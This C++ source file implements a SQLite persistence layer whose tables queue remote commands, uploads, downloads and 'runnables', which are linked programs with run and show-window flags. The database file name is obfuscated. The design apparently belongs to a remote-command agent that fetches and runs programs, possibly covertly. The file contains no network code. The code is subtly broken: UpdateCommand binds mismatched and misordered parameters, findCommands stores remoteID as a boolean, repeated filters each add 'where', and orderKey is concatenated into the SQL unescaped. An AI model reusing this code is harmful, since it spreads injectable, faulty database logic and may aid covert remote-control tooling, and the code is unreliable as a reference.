#include "DB.h"
#include "App.h"
#include "Encrypter.h"
#include "Models.h"
#include "memory"
#include <string>
#include <sqlite3.h>
#include <mutex>
std::shared_ptr<SQLite::Database> db;
std::mutex dbMutex;
std::string getDBPath()
{
    std::string path;
    auto dbName = Encrypter::Encrypt(OBFUSCATED("database.db"));
    if (dbName.size() > 16)
    {
        dbName.resize(16);
    }
    path = (fs::path(GetAssetDir()) /= dbName).string();
    return path;
}

void initializeDB()
{
    dbMutex.lock();
    auto dbPath = getDBPath();
    db = std::make_shared<SQLite::Database>(SQLite::Database(dbPath, SQLite::OPEN_READWRITE | SQLite::OPEN_CREATE));

    // Command
    std::string query = R"(
CREATE TABLE IF NOT EXISTS "Command" (
	"id"	INTEGER NOT NULL UNIQUE,
	"remoteID"	TEXT UNIQUE,
	"commandType"	INTEGER NOT NULL DEFAULT 0,
	"payload"	TEXT,
	"processed"	INTEGER NOT NULL DEFAULT 0,
	"created_at"	NUMERIC,
	"updated_at"	NUMERIC,
	PRIMARY KEY("id" AUTOINCREMENT)
);
    )";
    int status = db->exec(query);
    // Upload
    query = R"(
CREATE TABLE IF NOT EXISTS "Upload" (
	"id"	INTEGER NOT NULL UNIQUE,
    "remoteID"	TEXT NOT NULL UNIQUE,
	"path"	TEXT NOT NULL,
	"progress"	INTEGER NOT NULL DEFAULT 0,
	"status"	INTEGER NOT NULL DEFAULT 0,
	"error"	TEXT,
	"created_at"	INTEGER NOT NULL DEFAULT 0,
	"updated_at"	INTEGER NOT NULL DEFAULT 0,
	PRIMARY KEY("id" AUTOINCREMENT)
);
    )";
    status = db->exec(query);
    // Download
    query = R"(
CREATE TABLE IF NOT EXISTS "Download" (
	"id"	INTEGER NOT NULL UNIQUE,
	"link"	TEXT NOT NULL,
	"remoteID"	TEXT NOT NULL UNIQUE,
	"progress"	INTEGER NOT NULL DEFAULT 0,
	"status"	INTEGER NOT NULL DEFAULT 0,
	"error"	TEXT,
	"created_at"	INTEGER NOT NULL DEFAULT 0,
	"updated_at"	INTEGER NOT NULL DEFAULT 0,
	PRIMARY KEY("id" AUTOINCREMENT)
);
    )";
    status = db->exec(query);

    // runnable
    query = R"(
CREATE TABLE IF NOT EXISTS "Runnable" (
	"id"	INTEGER NOT NULL UNIQUE,
	"showWindow"	INTEGER NOT NULL DEFAULT 0,
	"run"	INTEGER NOT NULL DEFAULT 0,
	"name"	TEXT NOT NULL,
	"status"	INTEGER NOT NULL DEFAULT 0,
	"remoteID"	TEXT NOT NULL UNIQUE,
	"link"	TEXT NOT NULL,
	"created_at"	INTEGER NOT NULL DEFAULT 0,
	"updated_at"	INTEGER NOT NULL DEFAULT 0,
	PRIMARY KEY("id" AUTOINCREMENT)
);
    )";
    status = db->exec(query);
    dbMutex.unlock();
}

std::shared_ptr<Runnable> SaveRunnable(Runnable runnable)
{

    std::shared_ptr<Runnable> result = nullptr;
    std::string queryStr = R"(
    INSERT INTO Runnable (showWindow , run , name ,status ,remoteID ,link ,created_at ,updated_at) VALUES ( ? , ? , ? , ? , ? , ? , ? , ?)
)";
    SQLite::Statement statement(*db, queryStr);
    if (runnable.created_at == 0)
    {
        runnable.created_at = getSystemTime();
    }
    runnable.updated_at = getSystemTime();

    // Bind the integer value 6 to the first parameter of the SQL query
    statement.bind(1, runnable.showWindow);
    statement.bind(2, runnable.run);
    statement.bind(3, runnable.name);
    statement.bind(4, (int)runnable.status);
    statement.bind(5, runnable.remoteID);
    statement.bind(6, runnable.link);
    statement.bind(7, runnable.created_at);
    statement.bind(8, runnable.updated_at);
    dbMutex.lock();
    int rows = statement.exec();
    if (rows > 0)
    {
        int64_t id = (int64_t)sqlite3_last_insert_rowid(db->getHandle());
        if (id > 0)
        {
            result = findRunnable(id);
        }
    }
    dbMutex.unlock();
    return result;
}
std::shared_ptr<Runnable> UpdateRunnable(Runnable runnable)
{

    std::shared_ptr<Runnable> result = nullptr;
    std::string queryStr = R"(
    UPDATE Runnable SET showWindow = ? , run = ? , name = ? , status = ? ,remoteID = ? , link = ? , updated_at = ? where id = ? 
    )";
    SQLite::Statement statement(*db, queryStr);

    runnable.updated_at = getSystemTime();

    // Bind the integer value 6 to the first parameter of the SQL query
    statement.bind(1, runnable.showWindow ? 1 : 0);
    statement.bind(2, runnable.run ? 1 : 0);
    statement.bind(3, runnable.name);
    statement.bind(4, (int)runnable.status);
    statement.bind(5, runnable.remoteID);
    statement.bind(6, runnable.link);
    // statement.bind(7, runnable.created_at);
    statement.bind(7, runnable.updated_at);
    statement.bind(8, runnable.id);
    dbMutex.lock();
    int rows = statement.exec();
    if (rows > 0)
    {
        result = findRunnable(runnable.id);
    }
    dbMutex.unlock();
    return result;
}
std::shared_ptr<Runnable> findRunnable(int64_t id)
{
    std::shared_ptr<Runnable> result = nullptr;
    std::string queryStr = R"(
    SELECT * from Runnable where id = ?
)";
    SQLite::Statement statement(*db, queryStr);
    statement.bind(1, id);
    try
    {
        if (statement.executeStep())
        {
            result = std::make_shared<Runnable>(Runnable());
            result->id = statement.getColumn(0).getInt();
            result->showWindow = statement.getColumn(1).getInt() != 0;
            result->run = statement.getColumn(2).getInt() != 0;
            result->name = statement.getColumn(3).getString();
            result->status = (Status)statement.getColumn(4).getInt();
            result->remoteID = statement.getColumn(5).getString();
            result->link = statement.getColumn(6).getString();
            result->created_at = statement.getColumn(7).getInt64();
            result->updated_at = statement.getColumn(8).getInt64();
        }
    }
    catch (std::exception ex)
    {
        std::cout << ex.what();
    }

    return result;
}
std::vector<Runnable> findRunnables(std::map<std::string, DBValue> params, int limit, std::string orderKey, bool desc)
{
    std::vector<Runnable> runnables;

    std::shared_ptr<SQLite::Statement> statement;
    std::string queryStr = R"(
    SELECT * from Runnable 
)";
    if (params.size() > 0)
    {
        int loop = 1;
        for (auto &param : params)
        {
            queryStr += " where ";
            queryStr += param.first;
            queryStr += " ";
            std::string equality = "=";
            switch (param.second.equality)
            {
            case DBEquality::EQUAL:
                equality = "=";
                break;
            case DBEquality::LESSTHAN:
                equality = "<";
                break;
            case DBEquality::GREATERTHAN:
                equality = ">";
                break;

            default:
                equality = "=";
                break;
            }
            queryStr += equality + " ?";
        }
        queryStr += " ORDER BY " + orderKey;
        queryStr += desc ? " DESC " : " ASC ";
        if (limit > 0)
        {
            queryStr += " limit ";
            queryStr += std::to_string(limit);
        }
        statement = std::make_shared<SQLite::Statement>(SQLite::Statement(*db, queryStr));
        for (auto &param : params)
        {
            if (param.second.boolValue != nullptr)
            {
                statement->bind(loop, *param.second.boolValue);
            }
            else if (param.second.doubleValue != nullptr)
            {
                statement->bind(loop, *param.second.doubleValue);
            }
            else if (param.second.intValue != nullptr)
            {
                statement->bind(loop, *param.second.intValue);
            }
            else if (param.second.stringValue != nullptr)
            {
                statement->bind(loop, *param.second.stringValue);
            }
            loop++;
        }
    }
    else
    {
        queryStr += " ORDER BY " + orderKey;
        queryStr += desc ? " DESC " : " ASC ";
        if (limit > 0)
        {
            queryStr += " limit ";
            queryStr += std::to_string(limit);
        }
        statement = std::make_shared<SQLite::Statement>(SQLite::Statement(*db, queryStr));
    }

    try
    {
        while (statement->executeStep())
        {
            Runnable runnable = Runnable();
            runnable.id = statement->getColumn(0).getInt();
            runnable.showWindow = statement->getColumn(1).getInt() != 0;
            runnable.run = statement->getColumn(2).getInt() != 0;
            runnable.name = statement->getColumn(3).getString();
            runnable.status = (Status)statement->getColumn(4).getInt();
            runnable.remoteID = statement->getColumn(5).getString();
            runnable.link = statement->getColumn(6).getString();
            runnable.created_at = statement->getColumn(7).getInt64();
            runnable.updated_at = statement->getColumn(8).getInt64();
            runnables.push_back(runnable);
        }
    }
    catch (std::exception ex)
    {
        std::cout << ex.what();
    }

    return runnables;
}
bool deleteRunnable(int64_t id)
{
    std::shared_ptr<Runnable> result = nullptr;
    std::string queryStr = R"(
    DELETE from Runnable where id = ?
)";
    SQLite::Statement statement(*db, queryStr);

    // Bind the integer value 6 to the first parameter of the SQL query
    statement.bind(1, id);
    try
    {

        if (statement.exec() > 0)
        {
            return true;
        }
    }
    catch (std::exception ex)
    {
        std::cout << ex.what();
    }

    return false;
}

std::shared_ptr<Command> SaveCommand(Command runnable)
{

    std::shared_ptr<Command> result = nullptr;
    std::string queryStr = R"(
    INSERT INTO Command (remoteID , commandType , payload ,processed ,created_at ,updated_at) VALUES ( ? , ? , ? , ? , ? , ? )
)";
    dbMutex.lock();
    SQLite::Statement statement(*db, queryStr);
    if (runnable.created_at == 0)
    {
        runnable.created_at = getSystemTime();
    }
    runnable.updated_at = getSystemTime();

    // Bind the integer value 6 to the first parameter of the SQL query
    statement.bind(1, runnable.remoteID);
    statement.bind(2, (int)runnable.commandType);
    statement.bind(3, runnable.payload);
    statement.bind(4, runnable.processed ? 1 : 0);
    statement.bind(5, runnable.created_at);
    statement.bind(6, runnable.updated_at);

    int rows = statement.exec();
    if (rows > 0)
    {
        int64_t id = (int64_t)sqlite3_last_insert_rowid(db->getHandle());
        if (id > 0)
        {
            result = findCommand(id);
        }
    }
    dbMutex.unlock();
    return result;
}
std::shared_ptr<Command> UpdateCommand(Command command)
{

    std::shared_ptr<Command> result = nullptr;
    std::string queryStr = R"(
    UPDATE Command SET remoteID = ? , commandType = ? , payload = ? , processed = ? , updated_at = ? where id = ? 
    )";
    SQLite::Statement statement(*db, queryStr);

    command.updated_at = getSystemTime();

    // Bind the integer value 6 to the first parameter of the SQL query
    statement.bind(1, command.remoteID);
    statement.bind(2, (int)command.commandType);
    statement.bind(3, command.payload);
    statement.bind(4, command.processed ? 1 : 0);
    statement.bind(5, command.remoteID);
    statement.bind(6, command.updated_at);
    statement.bind(7, command.id);

    dbMutex.lock();
    int rows = statement.exec();
    if (rows > 0)
    {
        result = findCommand(command.id);
    }
    dbMutex.unlock();
    return result;
}
std::shared_ptr<Command> findCommand(int64_t id)
{
    std::shared_ptr<Command> result = nullptr;
    std::string queryStr = R"(
    SELECT * from Command where id = ?
)";
    SQLite::Statement statement(*db, queryStr);
    statement.bind(1, id);
    try
    {
        if (statement.executeStep())
        {
            result = std::make_shared<Command>(Command());
            result->id = statement.getColumn(0).getInt();
            result->remoteID = statement.getColumn(1).getString();
            result->commandType = (CommandType)statement.getColumn(2).getInt();
            result->payload = statement.getColumn(3).getString();
            result->processed = statement.getColumn(4).getInt() != 0;
            result->created_at = statement.getColumn(5).getInt64();
            result->updated_at = statement.getColumn(6).getInt64();
        }
    }
    catch (std::exception ex)
    {
        std::cout << ex.what();
    }

    return result;
}
std::vector<Command> findCommands(std::map<std::string, DBValue> params, int limit, std::string orderKey, bool desc)
{
    std::vector<Command> runnables;

    std::shared_ptr<SQLite::Statement> statement;
    std::string queryStr = R"(
    SELECT * from Command 
)";
    if (params.size() > 0)
    {
        int loop = 1;
        for (auto &param : params)
        {
            queryStr += " where ";
            queryStr += param.first;
            queryStr += " ";
            std::string equality = "=";
            switch (param.second.equality)
            {
            case DBEquality::EQUAL:
                equality = "=";
                break;
            case DBEquality::LESSTHAN:
                equality = "<";
                break;
            case DBEquality::GREATERTHAN:
                equality = ">";
                break;

            default:
                equality = "=";
                break;
            }
            queryStr += equality + " ?";
        }
        queryStr += " ORDER BY " + orderKey;
        queryStr += desc ? " DESC " : " ASC ";
        if (limit > 0)
        {
            queryStr += " limit ";
            queryStr += std::to_string(limit);
        }
        statement = std::make_shared<SQLite::Statement>(SQLite::Statement(*db, queryStr));
        for (auto &param : params)
        {
            if (param.second.boolValue != nullptr)
            {
                statement->bind(loop, *param.second.boolValue);
            }
            else if (param.second.doubleValue != nullptr)
            {
                statement->bind(loop, *param.second.doubleValue);
            }
            else if (param.second.intValue != nullptr)
            {
                statement->bind(loop, *param.second.intValue);
            }
            else if (param.second.stringValue != nullptr)
            {
                statement->bind(loop, *param.second.stringValue);
            }
            loop++;
        }
    }
    else
    {
        queryStr += " ORDER BY " + orderKey;
        queryStr += desc ? " DESC " : " ASC ";
        if (limit > 0)
        {
            queryStr += " limit ";
            queryStr += std::to_string(limit);
        }
        statement = std::make_shared<SQLite::Statement>(SQLite::Statement(*db, queryStr));
    }

    try
    {
        while (statement->executeStep())
        {
            Command runnable = Command();
            runnable.id = statement->getColumn(0).getInt();
            runnable.remoteID = statement->getColumn(1).getInt() != 0;
            runnable.commandType = (CommandType)statement->getColumn(2).getInt();
            runnable.payload = statement->getColumn(3).getString();
            runnable.processed = (Status)statement->getColumn(4).getInt() != 0;

            runnable.created_at = statement->getColumn(5).getInt64();
            runnable.updated_at = statement->getColumn(6).getInt64();
            runnables.push_back(runnable);
        }
    }
    catch (std::exception ex)
    {
        std::cout << ex.what();
    }

    return runnables;
}
bool deleteCommand(int64_t id)
{
    std::shared_ptr<Runnable> result = nullptr;
    std::string queryStr = R"(
    DELETE from Command where id = ?
)";
    SQLite::Statement statement(*db, queryStr);
    statement.bind(1, id);
    try
    {
        if (statement.exec() > 0)
        {
            return true;
        }
    }
    catch (std::exception ex)
    {
        std::cout << ex.what();
    }

    return false;
}